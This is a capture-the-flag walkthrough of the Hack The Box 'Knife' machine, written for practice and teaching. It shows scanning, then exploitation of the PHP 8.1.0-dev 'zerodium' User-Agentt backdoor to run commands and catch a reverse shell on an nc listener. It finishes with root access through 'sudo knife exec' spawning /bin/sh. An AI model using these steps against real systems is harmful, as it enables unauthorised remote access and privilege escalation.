# Hack The Box - Knife Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Knife]
└─$ sudo nmap -sC -sV -O -oN nmap/initial 10.10.10.242
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 06:28 EST
Nmap scan report for 10.10.10.242
Host is up (0.30s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
26/tcp    filtered rsftp
80/tcp    open     http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
1022/tcp  filtered exp2
1080/tcp  filtered socks
1119/tcp  filtered bnetgame
1174/tcp  filtered fnet-remote-ui
3995/tcp  filtered iss-mgmt-ssl
8081/tcp  filtered blackice-icecap
8292/tcp  filtered blp3
16001/tcp filtered fmsascon
40193/tcp filtered unknown
Aggressive OS guesses: Linux 3.1 (89%), Linux 3.2 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.16 (87%), Linux 2.6.31 - 2.6.32 (85%), Thecus 4200 or N5500 NAS device (Linux 2.6.33) (85%), Android 4.1.1 (85%), Citrix XenServer 6.1 (Linux 2.6.32) (85%), Linux 3.2 - 4.9 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.14 seconds
```

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan to covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Knife]
└─$ sudo nmap -sC -sV -O -p- -oN nmap/initial 10.10.10.242
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 06:29 EST
Nmap scan report for 10.10.10.242
Host is up (0.30s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
26/tcp    filtered rsftp
80/tcp    open     http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
1022/tcp  filtered exp2
1080/tcp  filtered socks
1119/tcp  filtered bnetgame
1174/tcp  filtered fnet-remote-ui
3995/tcp  filtered iss-mgmt-ssl
8081/tcp  filtered blackice-icecap
8292/tcp  filtered blp3
16001/tcp filtered fmsascon
40193/tcp filtered unknown
Aggressive OS guesses: Linux 3.1 (89%), Linux 3.2 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.16 (87%), Linux 2.6.31 - 2.6.32 (85%), Thecus 4200 or N5500 NAS device (Linux 2.6.33) (85%), Android 4.1.1 (85%), Citrix XenServer 6.1 (Linux 2.6.32) (85%), Linux 3.2 - 4.9 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 284.14 seconds
```


## Enumeration
Visiting the website on port `80`, I found out that the site is for a medical group:

![knf-1](https://user-images.githubusercontent.com/87711310/213914127-4a360974-c36c-439b-8ab0-7fd2c621a8e8.png)

That’s the entire page. There is nothing on the page to interact with.

So I checked out the `source-code` and there was nothing there too.

I ran gobuster against the site to brute-force directories.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Knife]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.242 -o gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/22 06:29:47 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
                                               
===============================================================
2023/01/22 6:49:04 Finished
===============================================================

```

There is a `/server-status` page, but nothing interesting.

I was lil bit confused there was no way this easy machine would be this complicated to enumerate.

After a while, I decided to run Burp against the web-site to intercept the traffic.

The response header looked wierd as it contained `X-Powered-By: PHP/8.1.0-dev`:

```
HTTP/1.1 200 OK
Date: Sat, 22 May 2021 19:30:15 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```

I instantly googled `PHP 8.1.0 dev exploit` found out [this](https://www.exploit-db.com/exploits/49933) exploit 

![knf-2](https://user-images.githubusercontent.com/87711310/213914404-a2f5001d-369c-4a2f-9e33-630b29b7c1a9.png)

#### Backdoor Details
Because of how GitHub and open-source works, I can look right at the commit that adds the `backdoor` into the `PHP` codebase. The commit changes one file, `ext/zlib/zlib.c`, adding 11 lines of code (all in green):

![knf-3](https://user-images.githubusercontent.com/87711310/213914448-ba8c56eb-4a96-42e6-bc9f-b37b4adb65a4.png)

It’s fascinating to see others commenting on the commit, the first comment asking if the misspelling of `HTTP_USER_AGENT` as `HTTP_USER_AGENTT` was a mistake, and four lines later someone asking what it did, and someone else responding basically that’s it’s a `backdoor`, and how it works.

As the devs point out, to execute this backdoor, I’ll need a `User-Agentt` header that starts with `zerodium`, and whatever is after that will be executed as `PHP` code.

## Exploitation

To test this, I’ll send the `GET` request over to Burp Repeater and replace the `User-Agent` header with the malicious one:

![knf-4](https://user-images.githubusercontent.com/87711310/213914528-299c9783-c7b9-4a95-b70c-d78151556daf.png)

It runs `system("id")` and the result is at the top of the response.

__Getting a Shell__: 
I’ll replace id with a reverse shell, and run it again.

![knf-5](https://user-images.githubusercontent.com/87711310/213914621-1f13b054-04b5-40e0-9ae6-772e6b4b6875.png)

The response just hangs, but at `nc`, I’ve got a shell:
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes]
└─$ nc -lvnp 1234                              
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.242] 39268
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ whoami
whoami
james

```

I just grabbed the user flag:

```
james@knife:/$ ls
ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
james@knife:/$ cd home
cd homel
james@knife:/home$ s
ls
james
james@knife:/home$ cd james
cd james
james@knife:~$ ls
ls
user.txt
james@knife:~$ cat user.txt
cat user.txt
[REDACTED]
```

## Privilege Eescalation

I checked `sudo -l` to look at files/services I could run as `sudo`

```
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

james can run `knife` as `root`.

I went to GTFObins page to find the payload for [Knife](https://gtfobins.github.io/gtfobins/knife/). `knife` has an `exec` command that will run Ruby code.

```
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
whoami
root
cat /root/root.txt
[REDACTED]
```

And could easily retrieve the root flag.



